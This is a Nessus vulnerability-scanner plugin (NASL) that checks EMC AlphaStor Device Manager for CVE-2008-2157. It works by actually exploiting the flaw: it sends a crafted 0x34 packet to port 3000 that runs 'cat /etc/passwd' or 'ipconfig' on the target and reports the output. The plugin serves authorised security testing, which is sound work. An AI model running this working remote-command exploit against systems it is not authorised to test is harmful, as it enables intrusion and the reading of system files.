#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(33284);
  script_version("1.21");
  script_cvs_date("Date: 2018/11/15 20:50:22");

  script_cve_id("CVE-2008-2157");
  script_bugtraq_id(29398);

  script_name(english:"EMC AlphaStor Device Manager robotd RCE");
  script_summary(english:"Checks AlphaStor Device Manager robotd command execution.");

  script_set_attribute(attribute:"synopsis", value:
"The remote tape backup manager is affected by a remote command
execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The AlphaStor Device Manager application running on the remote host is
affected by a remote command execution vulnerability in robotd due to
improper sanitization of packet string arguments before using them in
a call to the 'system' function. An unauthenticated, remote attacker
can exploit this, via a specially crafted packet with a 0x34 code, to
execute arbitrary commands with SYSTEM/root privileges.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2008/May/305");
  script_set_attribute(attribute:"see_also", value:"https://securitytracker.com/id?1020116");
  script_set_attribute(attribute:"solution", value:
"Apply the latest update referenced in EMC knowledgebase article
emc186391.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
  script_cwe_id(20);

  script_set_attribute(attribute:"vuln_publication_date", value: "2008/05/27");
  script_set_attribute(attribute:"patch_publication_date", value: "2008/05/27");
  script_set_attribute(attribute:"plugin_publication_date", value: "2008/07/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2008-2018 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("alphastor_devicemanager_detect.nasl");
  script_require_ports("Services/alphastor-devicemanager", 3000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("byte_func.inc");

function mk_command(cmd, s)
{
 local_var len;

 len = strlen(s);

 return mkbyte(cmd + 0x41) + s + crap(data:mkbyte(0), length:0x200-len) + mkbyte(0);
}

function execute_command(port, cmd)
{
 local_var soc, req, res, code, len;

 soc = open_sock_tcp(port); 
 if (!soc) exit(0);

 req = mk_command(cmd:0x34, s:cmd);
 send(socket:soc, data:req);

 res = recv(socket:soc, length:8, min:8);
 if (isnull(res) || strlen(res) < 8) exit(0);

 code = getdword(blob:res, pos:0);
 len = getdword(blob:res, pos:4);

 if (code != 0) return NULL;

 res = recv(socket:soc, length:len, min:len);
 if (isnull(res) || strlen(res) < len) exit(0);

 return substr(res, 0, len-2);
}

port = get_service(svc:"alphastor-devicemanager", default: 3000, exit_on_fail: TRUE);

cmd = "cat /etc/passwd";
pat = "root:x:0:0";

res = execute_command(port:port, cmd:cmd);
if (!res)
{
 cmd = "ipconfig";
 pat = "Windows IP Configuration";
 res = execute_command(port:port, cmd:cmd);
}

if (pat >!< res) audit(AUDIT_LISTEN_NOT_VULN, "service", port);
report = string (
         "\nThe output of the command '", cmd, "' is:\n\n",
         res );

security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
